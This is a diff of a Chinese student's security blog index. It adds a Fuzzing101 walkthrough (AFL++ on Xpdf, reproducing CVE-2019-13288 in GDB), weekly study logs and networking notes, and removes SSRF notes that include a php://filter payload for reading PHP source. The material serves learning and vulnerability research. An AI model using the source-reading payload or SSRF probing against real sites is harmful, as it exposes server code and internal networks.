-<p><strong>疑问</strong>：这里改<code>url=</code>后面的地址，跳转为什么会页面重叠？读取PHP文件的源码不太理解，通关参考之后的内网请求&amp;探测主机内网22端口是否开启的方法也不是很理解。</p>
-</blockquote>
-<p>Server-Side Request Forgery 服务器端请求伪造。服务端提供了从其他服务器应用获取数据的功能，但又没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器对其发起请求，并返回对该目标地址请求的数据。</p>
-<p>PHP中<code>file_get_contents()</code> <code>fsockopen()</code> <code>fsockopen()</code>这几个函数使用不当会导致SSRF。</p>
-<p>如果一定要通过后台服务器远程去对用户指定（或预埋在前端的请求）的地址进行资源请求，要做好目标地址的过滤。</p>
-<p>读取PHP文件的源码:<code>php://filter/read=convert.base64-encode/resource=ssrf.php</code></p>
-<p><img src="D:\blog\coriiiander\source_posts\pictures\获取php源码.png" alt="获取php源码"></p>
+    <title>resource</title>
+    <url>/2022/07/05/resource/</url>
+    <content><![CDATA[<p>这里记录了笔者冲浪过程中得到的一些学习灵感。</p>
+<h4 id="0x00-书单"><a href="#0x00-书单" class="headerlink" title="0x00 书单"></a>0x00 书单</h4><p><a href="https://eternalsakura13.com/2018/05/31/shudan/">sakura的ctf re/pwn入门书单</a></p>
+<p><a href="https://blog.csdn.net/wenrennaoda/article/details/98751217">二进制安全书籍推荐</a></p>
+<p>《漏洞战争》1.5 学习资源分享</p>
 ]]></content>
   </entry>
   <entry>
@@ -848,44 +194,794 @@
 ]]></content>
   </entry>
   <entry>
+    <title>fuzzing 101</title>
+    <url>/2022/10/30/fuzzing101/</url>
+    <content><![CDATA[<h4 id="Exercise-1-Xpdf"><a href="#Exercise-1-Xpdf" class="headerlink" title="Exercise 1 Xpdf"></a>Exercise 1 Xpdf</h4><h5 id="CVE-2019-13288"><a href="#CVE-2019-13288" class="headerlink" title="CVE-2019-13288"></a>CVE-2019-13288</h5><p>每个被调用的函数在栈上被分配一个栈帧，如果一个函数被递归调用很多次，可能会导致栈内存耗尽、程序崩溃（利用它发起DoS攻击）。CVE-2019-13288就是这样一个可通过精心制作的文件导致无限循环的漏洞。</p>
+<h5 id="Install-AFL"><a href="#Install-AFL" class="headerlink" title="Install AFL++"></a>Install AFL++</h5><p>Install the dependencies</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y build-essential python3-dev automake git flex bison libglib2.0-dev libpixman-1-dev python3-setuptools</span><br><span class="line">sudo apt-get install -y lld-11 llvm-11 llvm-11-dev clang-11 || sudo apt-get install -y lld llvm llvm-dev clang </span><br><span class="line">sudo apt-get install -y gcc-$(gcc --version|head -n1|sed &#x27;s/.* //&#x27;|sed &#x27;s/\..*//&#x27;)-plugin-dev libstdc++-$(gcc --version|head -n1|sed &#x27;s/.* //&#x27;|sed &#x27;s/\..*//&#x27;)-dev</span><br></pre></td></tr></table></figure>
+
+<p>Checkout and build AFL++</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd $HOME</span><br><span class="line">git clone https://github.com/AFLplusplus/AFLplusplus &amp;&amp; cd AFLplusplus</span><br><span class="line">export LLVM_CONFIG=&quot;llvm-config-11&quot;</span><br><span class="line">make distrib</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>make distrib: build binary and source distribution archives directory.</p>
+</blockquote>
+<p>type <code>afl-fuzz</code> then see something like this:</p>
+<img src="D:\blog\coriiiander\source\_posts\pictures\afl-fuzz.png" alt="afl-fuzz" style="zoom:67%;" />
+
+
+
+<h5 id="Download-and-build-your-target"><a href="#Download-and-build-your-target" class="headerlink" title="Download and build your target"></a>Download and build your target</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd $HOME</span><br><span class="line">mkdir fuzzing_xpdf &amp;&amp; cd fuzzing_xpdf/</span><br><span class="line">sudo apt install build-essential # install some additional tools (namely make and gcc)</span><br><span class="line">wget https://dl.xpdfreader.com/old/xpdf-3.02.tar.gz</span><br><span class="line">tar -xvzf xpdf-3.02.tar.gz</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>wget: retrieves content from web servers. It is part of the GNU Project. Its name derives from “World Wide Web” and “get.”</p>
+</blockquote>
+<p>Build Xpdf:</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd xpdf-3.02</span><br><span class="line">sudo apt update &amp;&amp; sudo apt install -y build-essential gcc</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">从源代码获取软件的常见三步</span></span><br><span class="line">./configure --prefix=&quot;$HOME/fuzzing_xpdf/install/&quot; #配置makefile</span><br><span class="line">make # 编译代码</span><br><span class="line">make install # 将可执行文件安装到标准位置</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>–prefix: 安装到…/install/目录</p>
+</blockquote>
+<p>下载一些测试文件：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd $HOME/fuzzing_xpdf</span><br><span class="line">mkdir pdf_examples &amp;&amp; cd pdf_examples</span><br><span class="line">wget https://github.com/mozilla/pdf.js-sample-files/raw/master/helloworld.pdf</span><br><span class="line">wget http://www.africau.edu/images/default/sample.pdf</span><br><span class="line">wget https://www.melbpc.org.au/wp-content/uploads/2017/10/small-example-pdf-file.pdf</span><br></pre></td></tr></table></figure>
+
+<p>测试pdfinfo二进制文件：<code>$HOME/fuzzing_xpdf/install/bin/pdfinfo -box -meta $HOME/fuzzing_xpdf/pdf_examples/sample.pdf</code></p>
+<img src="D:\blog\coriiiander\source\_posts\pictures\pdfinfo.png" alt="pdfinfo" style="zoom:67%;" />
+
+
+
+<h5 id="Meet-AFL"><a href="#Meet-AFL" class="headerlink" title="Meet AFL++"></a>Meet AFL++</h5><p>AFL是一个<strong>覆盖导向的模糊器</strong>，它为每个变异的输入收集覆盖信息以发现新的执行路径和潜在漏洞。当源代码有效时，AFL可以使用插桩（instrumentation），在每个基本块（函数、循环等）的开头插入函数调用。</p>
+<p>为了确保为我们的目标应用程序插桩，我们需要用AFL的编译器编译代码。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">清除之前编译的目标文件和可执行文件</span></span><br><span class="line">rm -r $HOME/fuzzing_xpdf/install</span><br><span class="line">cd $HOME/fuzzing_xpdf/xpdf-3.02/</span><br><span class="line">make clean</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">用afl-clang-fast编译器构建xpdf</span></span><br><span class="line">export LLVM_CONFIG=&quot;llvm-config-11&quot;</span><br><span class="line">CC=$HOME/AFLplusplus/afl-clang-fast CXX=$HOME/AFLplusplus/afl-clang-fast++ ./configure --prefix=&quot;$HOME/fuzzing_xpdf/install/&quot;</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
+
+<p>运行fuzzer：<code>afl-fuzz -i $HOME/fuzzing_xpdf/pdf_examples/ -o $HOME/fuzzing_xpdf/out/ -s 123 -- $HOME/fuzzing_xpdf/install/bin/pdftotext @@ $HOME/fuzzing_xpdf/output</code></p>
+<blockquote>
+<p>-i：指示存放输入样例的目录；</p>
+<p>-o：指示AFL++存放变异文件的目录；</p>
+<p>-s：指示要使用的静态随机种子；</p>
+<p>@@：占位符，AFL将用每个输入文件名替换它。</p>
+</blockquote>
+<ul>
+<li><p><strong>运行fuzzer时遇到的问题</strong></p>
+<ul>
+<li><em>Hmm, your system is configured to send core dump notifications to an external utility</em></li>
+</ul>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">sudo su</span><br><span class="line">echo core &gt;<span class="regexp">/proc/</span>sys<span class="regexp">/kernel/</span>core_pattern</span><br><span class="line"><span class="keyword">exit</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>第一次报错：<code>/bin/pdftotext not found</code></li>
+</ul>
+<img src="D:\blog\coriiiander\source\_posts\pictures\config报错.png" alt="config报错" style="zoom:80%;" />
+
+<p>调用<code>sudo apt-get install libfreetype6-dev libmotif-dev libxt-dev</code>命令安装<code>libxt-dev</code>，<code>./configure</code>命令后增加<code>--with-freetype2-includes=/usr/include/freetype2</code>参数。</p>
+<ul>
+<li>第二次报错</li>
+</ul>
+ <img src="D:\blog\coriiiander\source\_posts\pictures\ex1报错2.png" alt="ex1报错2" style="zoom:80%;" />
+
+<p>命令重新输一遍又好了…script boy做实验是这样的。</p>
+</li>
+</ul>
+<p>总之，<strong>my first fuzzing</strong>！不值一提但是非常开心。</p>
+<img src="D:\blog\coriiiander\source\_posts\pictures\myFirstFuzzing.png" alt="myFirstFuzzing" style="zoom:80%;" />
+
+
+
+<h5 id="Reproduce-amp-fix"><a href="#Reproduce-amp-fix" class="headerlink" title="Reproduce &amp; fix"></a>Reproduce &amp; fix</h5><ul>
+<li><strong>Reproduce</strong></li>
+</ul>
+<p>在<code>$HOME/fuzzing_xpdf/out/</code>目录中定位到漏洞，将该文件作为输入传给pdftotex二进制文件：<code>$HOME/fuzzing_xpdf/install/bin/pdftotext &#39;$HOME/fuzzing_xpdf/out/default/crashes/&lt;your_filename&gt;&#39; $HOME/fuzzing_xpdf/output</code>.</p>
+<img src="D:\blog\coriiiander\source\_posts\pictures\CVE-2019-13288.png" alt="CVE-2019-13288" style="zoom: 75%;" />
+
+
+
+<ul>
+<li><strong>Triage</strong></li>
+</ul>
+<p>使用GDB找出此输入导致程序崩溃的原因。</p>
+<p>使用调试信息重建 Xpdf 以获得符号堆栈跟踪：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rm -r $HOME/fuzzing_xpdf/install</span><br><span class="line">cd $HOME/fuzzing_xpdf/xpdf-3.02/</span><br><span class="line">make clean</span><br><span class="line">CFLAGS=&quot;-g -O0&quot; CXXFLAGS=&quot;-g -O0&quot; ./configure --prefix=&quot;$HOME/fuzzing_xpdf/install/&quot;</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
+
+<p>运行GDB：<code>gdb --args $HOME/fuzzing_xpdf/install/bin/pdftotext $HOME/fuzzing_xpdf/out/default/crashes/&lt;your_filename&gt; $HOME/fuzzing_xpdf/output</code></p>
+<p>在 GDB 中输入 <code> &gt;&gt; run</code></p>
+<img src="D:\blog\coriiiander\source\_posts\pictures\fuzzing101.1.1.png" alt="fuzzing101.1.1" style="zoom:80%;" />
+
+<p>键入<code>bt</code>获取回溯：滚动调用堆栈，看到许多<code>Parser::getObj</code>调用，这似乎表明无限递归。</p>
+<img src="D:\blog\coriiiander\source\_posts\pictures\fuzzing101.1.2.png" alt="fuzzing101.1.2" style="zoom:80%;" />
+
+
+
+<h4 id="Exercise-2-libexif"><a href="#Exercise-2-libexif" class="headerlink" title="Exercise 2 libexif"></a>Exercise 2 libexif</h4><h5 id="CVE-2009-3895-amp-CVE-2012-2836"><a href="#CVE-2009-3895-amp-CVE-2012-2836" class="headerlink" title="CVE-2009-3895 &amp; CVE-2012-2836"></a>CVE-2009-3895 &amp; CVE-2012-2836</h5><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>命令大量参考 <a href="https://github.com/antonio-morales/Fuzzing101">https://github.com/antonio-morales/Fuzzing101</a></p>
+]]></content>
+  </entry>
+  <entry>
     <title>coriiiander&#39;s weekly</title>
     <url>/2022/06/20/weekly/</url>
-    <content><![CDATA[<h4 id="0x00-2022-6-20-6-26"><a href="#0x00-2022-6-20-6-26" class="headerlink" title="0x00 2022/6/20-6/26"></a>0x00 2022/6/20-6/26</h4><ol>
-<li>leetcode腾讯精选五十题*5（练JAVA/python），笔记发在leetcode题解上方便查看</li>
-<li>ROS 安装&amp;ROS的HelloWorld C++/python简单实现</li>
-<li>The Economist - Palm roiled &amp; Schumpeter</li>
-<li>工训STC-B焊接及测试案例</li>
+    <content><![CDATA[<h4 id="0x00-2022暑假"><a href="#0x00-2022暑假" class="headerlink" title="0x00 2022暑假"></a>0x00 2022暑假</h4><ol>
+<li>工训小学期</li>
+<li>ROS 通信机制</li>
+<li>The Economist 115-125期</li>
+<li>看书<ul>
+<li>《加密与解密第四版》C1</li>
+<li>《0 day安全第一章》C1&amp;16-20</li>
+<li>《逆向工程核心原理》C1-16</li>
+<li>《程序员的自我修养》C1</li>
+</ul>
+</li>
 </ol>
-<h4 id="0x01-6-27-7-3"><a href="#0x01-6-27-7-3" class="headerlink" title="0x01 6/27-7/3"></a>0x01 6/27-7/3</h4><ol>
-<li>工训BSP编程</li>
-<li>学了个微软双拼</li>
-<li> 高铁上入门一下二进制安全，入门失败</li>
+<p>5.学习了简单的pikachu</p>
+<p>6.思考人生</p>
+<p>7.另有一个月时间事因不便学习</p>
+<h4 id="0x01-10-20-10-23"><a href="#0x01-10-20-10-23" class="headerlink" title="0x01 10/20 - 10/23"></a>0x01 10/20 - 10/23</h4><blockquote>
+<p>CNATDA</p>
+</blockquote>
+<ul>
+<li>发现了一个很不错的网站：<a href="https://csdiy.wiki/">CS自学指南</a></li>
+<li>CNATDA：<a href="https://gaia.cs.umass.edu/kurose_ross/lectures.php">课程视频</a>讲的很好，最重要的是时长在可接受范围内。搭配<a href="https://kiprey.github.io/2021/05/cnatda-1/">肖神的笔记</a>学习。要做自己的笔记——无法复述出来的都是没学会的。微软输入法没有英文联想，急死了，下个讯飞输入法。…讯飞输入法也太丑了，删了…不想下搜狗。下周能不能开CS144。</li>
+<li>seed：Shellshock Attack，下载了n多次虚拟机，麻了。</li>
+<li>要坚持每天英语阅读。</li>
+</ul>
+<p><font size=3 face="楷体">下学期要开始准备考研，校内课程还要兼顾，我只有半年时间，完全不够用。</font></p>
+<h4 id="0x02-10-24-10-30"><a href="#0x02-10-24-10-30" class="headerlink" title="0x02 10/24 - 10/30"></a>0x02 10/24 - 10/30</h4><blockquote>
+<p>CNATDA &amp; CS144</p>
+</blockquote>
+<ul>
+<li>CS144：同步开始吧，毕竟我容易犯重理论轻实践的毛病。完成了Lab 0。</li>
+<li>CNATDA：Chapter 3结束。后几节图表有点多，有点难。</li>
+<li>软测课设：wifiDOS(ESP8266)，怎么才能用30分钟展示这个小实验。</li>
+<li>fuzzing: <a href="https://github.com/antonio-morales/Fuzzing101">fuzzing101</a>. 我找到了很好的fuzzing学习资源 - <a href="https://aflplus.plus/docs/tutorials/">afl++tutorials</a>. 重启是解决一切问题的根本方法，昨天的bug今天再运行一遍突然就好了。</li>
+</ul>
+<p><font size=3 face="楷体">现在重拾fuzzing的话完全学不深入，最多成为一个脚本小子，杀了我吧，fuzzing门槛好高。</font></p>
+<h4 id="0x03-10-31-11-6"><a href="#0x03-10-31-11-6" class="headerlink" title="0x03 10/31 - 11/6"></a>0x03 10/31 - 11/6</h4><blockquote>
+<p>CNATDA &amp; CS144 &amp; AFL源码</p>
+</blockquote>
+<ul>
+<li>CNATDA：PPT看到Chapter 5。</li>
+<li>CS144：Lab 1。代码自己写还是写不出来。</li>
+<li>校设课程：软测&amp;算法期中复习。信安数学基础读了一篇论文《Jaqen A High-Performance Switch-Native Approach for Detecting and Mitigating Volumetric DDoS Attacks with Programmable Switches》花了挺多工夫但是没读懂没收获，无话可说。</li>
+<li>fuzzing：源码，看不懂。</li>
+<li>英语：选修课阅读。</li>
+</ul>
+<p><font size=3 face="楷体">收拾了一下情绪，果然脑细胞在体外能导向学习，在体内只能长出恋爱脑。</font></p>
+<h4 id="0x04-11-7-11-13"><a href="#0x04-11-7-11-13" class="headerlink" title="0x04 11/7 - 11/13"></a>0x04 11/7 - 11/13</h4><blockquote>
+<p>期中考试周 &amp; fuzzing101 &amp; CNATDA</p>
+</blockquote>
+<ul>
+<li>fuzzing：发现一个有关内核漏洞挖掘的网站<a href="https://fuzzysecurity.com/tutorials.html%E3%80%82%E5%90%AC%E5%AD%99%E8%80%81%E5%B8%88%E7%9A%84%E5%BB%BA%E8%AE%AE%E4%B8%8D%E7%9C%8BAFL%E6%BA%90%E7%A0%81%E4%BA%86%EF%BC%8C%E5%81%9Afuzzing101">https://fuzzysecurity.com/tutorials.html。听孙老师的建议不看AFL源码了，做fuzzing101</a>. exercise1 &amp; 2.</li>
+<li>CNATDA：网课看不下去了，改看英文原版书。笔记才做到第四章。三天内一定要结束它！</li>
+<li>seed：Buffer Overflow Attack Lab.</li>
+</ul>
+<p><font size=3 face="楷体">关于我醉心网课被群友说“不适合看书”以及sakura师傅说“一般一本几百页的书，最多看一个周就看完了”的事情。sakura师傅还让我“先打好开发的基础吧”。哭，补天路漫漫。还想做编译原理，还想看《漏洞战争》。</font></p>
+<h4 id="0x05-11-14-11-20"><a href="#0x05-11-14-11-20" class="headerlink" title="0x05 11/14 - 11/20"></a>0x05 11/14 - 11/20</h4><blockquote>
+<p>CS143 &amp; CS144</p>
+</blockquote>
+<ul>
+<li>CNATDA：本周三结束了计网书的阅读。</li>
+<li>CS143：</li>
+</ul>
+]]></content>
+  </entry>
+  <entry>
+    <title>计算机网络笔记</title>
+    <url>/2022/10/23/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>这里记录了笔者学习《计算机网络：自顶向下方法》和编者的<a href="https://gaia.cs.umass.edu/kurose_ross/lectures.php">教学资料</a>的一些笔记。由于英文授课及部分翻译较拗口的原因，大部分内容将用英文书写。</p>
+<h4 id="Chapter-2-Appication-layer"><a href="#Chapter-2-Appication-layer" class="headerlink" title="Chapter 2  Appication layer"></a>Chapter 2  Appication layer</h4><ul>
+<li><p>application architecture</p>
+<ul>
+<li>client-server<ul>
+<li>server: always-on host, permanent IP address, often in data centers for scaling.</li>
+<li>clients: communicate with server, intermittently connected, may have dynamic IP addresses, not communicate directly with each other.</li>
+</ul>
+</li>
+<li>peer-to-peer <ul>
+<li>arbitrary end systems directly communicate, intermittently connected and dynamic IP addresses. each other’s server and clients.</li>
+<li>complex management</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>addressing processes（进程寻址）</p>
+<ul>
+<li>IP address &amp; port numbers</li>
+<li>port numbers: 80 - HTTP, 25 - mail, 53 - DNS.</li>
+</ul>
+</li>
+<li><p>transport protocols services</p>
+<ul>
+<li><p>TCP service</p>
+<ul>
+<li>reliable transport</li>
+<li>flow control: sender won’t overwhelm rcver</li>
+<li>congestion control: throttle sender when overloaded</li>
+<li>connection-oriented: setup required </li>
+<li>does not provide: timing（定时）, minthroughtput guarantee, security</li>
+</ul>
+</li>
+<li><p>UDP service</p>
+<ul>
+<li>unreliable data transfer and does not provide all things mentioned above</li>
+</ul>
+<blockquote>
+<p>existence significance: we can build additional services in the app layer.</p>
+</blockquote>
+</li>
+<li><p>TLS - Transport Layer Security</p>
+<ul>
+<li>vanilla TCP &amp; UDP sockets: no encryption &amp; cleartext</li>
+<li>encrypted TCP connections &amp; end-point authentication</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p><strong>socket</strong></p>
+<ul>
+<li>(only)application progamming interface down to the transport layer, process sends/recv msg to/from its socket.</li>
+</ul>
+<img src="D:\blog\coriiiander\source\_posts\pictures\socket.jpg" alt="socket" style="zoom:70%;" />
+
+<ul>
+<li>UDP</li>
+</ul>
+<img src="D:\blog\coriiiander\source\_posts\pictures\UDPsocket3.png" alt="UDPsocket3" style="zoom:60%;" />
+
+<img src="D:\blog\coriiiander\source\_posts\pictures\UDPsocket.png" alt="UDPsocket" style="zoom:60%;" />
+
+<img src="D:\blog\coriiiander\source\_posts\pictures\UDPsocket2.png" alt="UDPsocket2" style="zoom:60%;" />
+
+<ul>
+<li><p>TCP</p>
+<ul>
+<li>server process must first be running</li>
+<li>server: 1th.welcoming(listening) socket → 2nd.connection socket</li>
+<li>server is allowed to talk with multiple clients</li>
+</ul>
+<img src="D:\blog\coriiiander\source\_posts\pictures\TCPsocket.jpg" alt="TCPsocket" style="zoom:60%;" /></li>
+</ul>
+<img src="D:\blog\coriiiander\source\_posts\pictures\TCPsocket1.png" alt="TCPsocket1" style="zoom:60%;" />
+
+<img src="D:\blog\coriiiander\source\_posts\pictures\TCPsocket2.png" alt="TCPsocket2" style="zoom:60%;" /></li>
+<li><p>HTTP - hypertext transfer protocol</p>
+<ul>
+<li><p>stateless protocol: server maintains no info about past client requests. </p>
+<blockquote>
+<p>stateful: if crashes happened, states would be inconsistent and need reconciling. complex.</p>
+<p>how: at endpoints/in msg.</p>
+</blockquote>
+</li>
+<li><p>non-persistent HTTP（非持续连接）</p>
+<ul>
+<li><p>at most one object sent over TCP connection</p>
+</li>
+<li><p>response time = 2*RTT + file transmission time</p>
+</li>
+<li><p>issues</p>
+<ol>
+<li><p>2 RTTs per object</p>
+</li>
+<li><p>OS overhead for each TCP connection</p>
+</li>
+<li><p>open multiple parallel TCP connections(downloading multiple objects requires multiple connections)</p>
+</li>
 </ol>
-<p>学习能力和学习效率也就这样了</p>
-<img src="D:\blog\coriiiander\source\_posts\pictures\提问的智慧.png" alt="提问的智慧" style="zoom: 67%;" />
+</li>
+</ul>
+<img src="D:\blog\coriiiander\source\_posts\pictures\non-persistentHTTP.jpg" alt="non-persistentHTTP" style="zoom:70%;" /></li>
+<li><p>persistent HTTP(more used, HTTP 1.1)</p>
+<ul>
+<li>server leaves connection open after sending response</li>
+<li>multiple objects can be sent over single TCP connection</li>
+<li>one RTT reduced</li>
+</ul>
+</li>
+<li><p>HTTP msg</p>
+<ul>
+<li><p>request msg</p>
+<blockquote>
+<p>methods: POST GET HEAD PUT</p>
+</blockquote>
+<img src="D:\blog\coriiiander\source\_posts\pictures\HTTPrqmsg1.jpg" alt="HTTPrqmsg1" style="zoom:67%;" />
 
-<h4 id="暑假日报"><a href="#暑假日报" class="headerlink" title="暑假日报"></a>暑假日报</h4><p><strong>7/4</strong> ROS看了第二章通信机制，代码还得着重理解一下。</p>
-<p><strong>7/5</strong> 二进制安全进个货先；看了《加密与解密第四版》第一章 基础知识。</p>
-<p><strong>7/6</strong> 看了《0 day安全第一章》漏洞概述；《逆向工程核心原理》前两章 阅读第二章更全面地了解了OllyDbg的功能和使用；在考虑怎么高效做笔记。</p>
-<p><strong>7/7</strong> 《程序员的自我修养》看到第一章温故知新 - 操作系统，这本书没其他几本好看；继续看《逆向》3 - 12章，第一部分 代码逆向技术基础看完了，不理解的部分已标记下来。</p>
-<p><strong>7/8</strong> 晚上回来简单看了一下《逆向》的PE文件格式，为了皮肤不敢熬夜，睡觉😴。</p>
-<img src="D:\blog\coriiiander\source\_posts\pictures\校对女孩河野悦子.jpg" alt="校对女孩河野悦子" style="zoom: 67%;" />
+<img src="D:\blog\coriiiander\source\_posts\pictures\HTTPrqmsg2.jpg" alt="HTTPrqmsg2" style="zoom:67%;" /></li>
+<li><p>response msg</p>
+<p>◽ response status codes</p>
+<ol>
+<li>200 OK: succeeded</li>
+<li>301 moved permanently: moved and new location specified in this msg</li>
+<li>400 bad request: request msg not understood by server</li>
+<li>505 HTTP version not supported<img src="D:\blog\coriiiander\source\_posts\pictures\HTTPrpmsg1.jpg" alt="HTTPrpmsg1" style="zoom:67%;" /></li>
+</ol>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>cookies</p>
+<ul>
+<li><p>maintain some states between transactions</p>
+</li>
+<li><p>4 components: ①cookie header line of HTTP response message ②cookie header line in next HTTP request message ③cookie file kept on user’s host, managed by user’s browser ④back-end database at Web site</p>
+</li>
+</ul>
+<blockquote>
+<p>example: vivi visits a e-commerce site for first time.When initial HTTP requests arrives at site, site creates: unique ID (aka “cookie”) &amp; entry in backend database for ID.Subsequent HTTP requests will contain cookie ID value to identify vivi. </p>
+<p>privacy: after explicit consent.</p>
+</blockquote>
+</li>
+</ul>
+<img src="D:\blog\coriiiander\source\_posts\pictures\cookie.png" alt="cookie" style="zoom:67%;" />
 
-<p><strong>周末7/9 - 7/10</strong> 看完了PE文件格式、运行时压缩、基址重定位表（第16章）<strong>← 好难看啊</strong>；The Economist 121.124期。</p>
-<p><strong>7/11</strong> 浅浅看一下《0 day》第16-17章漏洞挖掘。</p>
-<p><strong>7/12</strong> The Economist 120期，准备pikachu。</p>
-<p><strong>7/13</strong> 学了一下burpsuite，pikachu暴力破解做了一题。</p>
-<p>​    被迫坐一天好不舒服😫效率好低好低</p>
-<p><strong>7/14</strong> pikachu暴破余下2题&amp;XSS做一半</p>
-<p><strong>7/15</strong> pika XSS剩下的一半&amp;CSRF</p>
-<p><strong>周末7/16 - 7/17</strong> pika SQL-Inject 大部分；The Economist 119.118期。</p>
-<p><strong>7/18</strong> 下午开始pika SQL-Inject余下一点；将所有只有一问的漏洞都简单看了一下，但是没有实践&amp;做笔记，有详细代码和函数的再查查、理解理解。</p>
-<p><strong>7/19</strong> pikachu做完</p>
-<p><strong>7/21</strong> 《0day》FTP漏洞挖掘</p>
-<p><strong>7/22</strong> 《0day》Email.ActiveX控件漏洞挖掘</p>
-<p><strong>7/23 - 7/27</strong> The Economist 6篇（到115期）</p>
-<p><strong>7/28 - 7/29</strong> 看TuesMagiqueB站125.124.123.122期的讲解（125.124在车上听的）；leetcode腾讯精选五十题两题</p>
-<p>​    由于工作电脑上啥都没有以及我个人的原因，pikachu做完后，低效了十天。其中只考虑了考研择校的事情，又苦于没有目标院校的专业课资料。下周把leetcode腾讯精选五十题做完，看看专业书、课件和外刊，拿到自己电脑后再继续ROS、STC、CTF的学习。</p>
+<ul>
+<li>web caches(aka proxy servers)<ul>
+<li>satisfy requests without involving origin server</li>
+<li>conditional GET: don’t send object if cache has up-to-date cached version</li>
+</ul>
+</li>
+</ul>
+<img src="D:\blog\coriiiander\source\_posts\pictures\conditionalGET.png" alt="conditionalGET" style="zoom:67%;" />
+
+<ul>
+<li><p>HTTP 2 &amp; 3</p>
+<blockquote>
+<p>HTTP 1.1: With FCFS, small object may wait for head-of-line (HOL) blocking. Loss recovery stalls.</p>
+</blockquote>
+<ul>
+<li>HTTP 2: Client-specified transmission order(not FCFS). Push unrequested objects beforehand. Divide objects into frames to mitig ate HOL blocking.</li>
+<li>HTTP 3: add security and congestion control (more pipelining) over UDP.</li>
+</ul>
+</li>
+<li><p>SMTP(Simple Mail Transfer Protocol)</p>
+<ul>
+<li>user agent —-SMTP—→ A‘s mail server —-TCP—→ B’s mail server —-SMTP—→ user agent</li>
+<li>persistent connections, multiple msg can be sent over a single smtp connection.</li>
+</ul>
+<blockquote>
+<p>IMAP：the same server.</p>
+</blockquote>
+<img src="D:\blog\coriiiander\source\_posts\pictures\SMTP.png" alt="SMTP" style="zoom:60%;" /></li>
+<li><p>DNS(Domain Name System)</p>
+<ul>
+<li>hierarchy</li>
+</ul>
+<img src="D:\blog\coriiiander\source\_posts\pictures\DNS1.png" alt="DNS1" style="zoom:67%;" />
+
+<ul>
+<li><p>name resolution</p>
+<ul>
+<li>iterated query</li>
+</ul>
+<img src="D:\blog\coriiiander\source\_posts\pictures\DNS2.jpg" alt="DNS2" style="zoom:55%;" />
+
+<ul>
+<li>recursive query</li>
+</ul>
+<img src="D:\blog\coriiiander\source\_posts\pictures\DNS3.png" alt="DNS3" style="zoom:65%;" /></li>
+<li><p>msg format</p>
+<ul>
+<li>DNS records: (name, value, type, ttl) type=A, NS, CNAME, MX.</li>
+</ul>
+<img src="D:\blog\coriiiander\source\_posts\pictures\DNS4.png" alt="DNS4" style="zoom:67%;" /></li>
+</ul>
+</li>
+<li><p>video streaming</p>
+<ul>
+<li>image coding redundancy: spatial - send only color value &amp; num of repeated values instead of sending N values of same color. temporal - send only diffs instead of complete one. </li>
+<li>playout buffering: jitter; DASH(Dynamic, Adaptive Streaming over HTTP): clients can choose different coding rates.</li>
+</ul>
+</li>
+<li><p>CDN(Content distribution networks)</p>
+<blockquote>
+<p>OTT: internet host-host communication as a service(netflix).</p>
+</blockquote>
+</li>
+</ul>
+<h4 id="Chapter-3-Transport-layer"><a href="#Chapter-3-Transport-layer" class="headerlink" title="Chapter 3 Transport layer"></a>Chapter 3 Transport layer</h4><blockquote>
+<p>network layer: logical communication between hosts; </p>
+<p>transport layer: logical communication between processes. Actions: change app layer msg into segment which will be passed to IP and segment header fields matters. Inverse process reverses.</p>
+</blockquote>
+<ul>
+<li>Multiplexing and demultiplexing<ul>
+<li>UDP: use IP address &amp; destination port number</li>
+<li>TCP: use 4-tuple - source and destination IP addresses, and port numbers</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li>UDP(User Datagram Protocol)<ul>
+<li>checksum: </li>
+</ul>
+</li>
+</ul>
+<img src="D:\blog\coriiiander\source\_posts\pictures\UDPformat.png" alt="UDPformat" style="zoom:60%;" />
+
+<ul>
+<li><p>TCP(Transmission Control Protocol)</p>
+<ul>
+<li><p>Reliable data transfer protocol (rdt)</p>
+<ul>
+<li>interfaces</li>
+</ul>
+<img src="D:\blog\coriiiander\source\_posts\pictures\rdtinterface.png" alt="rdtinterface" style="zoom:80%;" />
+
+<ul>
+<li>rdt1.0: reliable transfer over a reliable channel</li>
+</ul>
+<img src="D:\blog\coriiiander\source\_posts\pictures\rdt1.0.png" alt="rdt1.0" style="zoom:80%;" />
+
+<ul>
+<li><p>rdt2.0: channel with bit errors</p>
+<p>◽ use acknowledgements (ACKs) &amp; negative acknowledgements (NAKs) ,  retransmission to recover from errors.</p>
+<blockquote>
+<p>stop and wait: sender sends one packet,  then waits for receiver  response.</p>
+</blockquote>
+<p><img src="D:\blog\coriiiander\source\_posts\pictures\rdt2.0sender.png" alt="rdt2.0sender" style="zoom:70%;" />                  <img src="D:\blog\coriiiander\source\_posts\pictures\rdt2.0receiver.png" alt="rdt2.0receiver" style="zoom:75%;" /></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
